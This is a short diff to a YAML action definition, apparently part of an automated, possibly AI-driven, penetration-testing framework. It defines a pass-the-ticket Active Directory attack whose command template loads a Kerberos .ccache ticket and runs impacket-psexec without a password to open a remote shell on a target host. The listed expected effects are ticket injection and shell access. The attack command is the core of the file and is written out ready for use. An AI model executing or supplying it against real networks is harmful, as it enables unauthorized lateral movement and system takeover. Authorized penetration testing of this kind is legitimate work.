@@ -2,15 +2,17 @@ name: passtheticket
 category: ad
 description: Pass-the-ticket authentication with .ccache
 preconditions:
-  - domain_joined
+- domain_joined
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "export KRB5CCNAME='{ccache_file}'; impacket-psexec -k -no-pass {domain}/{target_user}@{target_ip}"
-parser: null
+command_template: export KRB5CCNAME='{ccache_file}'; impacket-psexec -k -no-pass {domain}/{target_user}@{target_ip}
+parser: impacket_parser
 expected_effects:
-  - action_completed
+- ticket_injected
+- shell_obtained
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Uses Kerberos ticket (.ccache) for authentication instead of password/hash. Works with all impacket tools via -k flag."
+mechanism: Uses Kerberos ticket (.ccache) for authentication instead of password/hash.
+  Works with all impacket tools via -k flag.
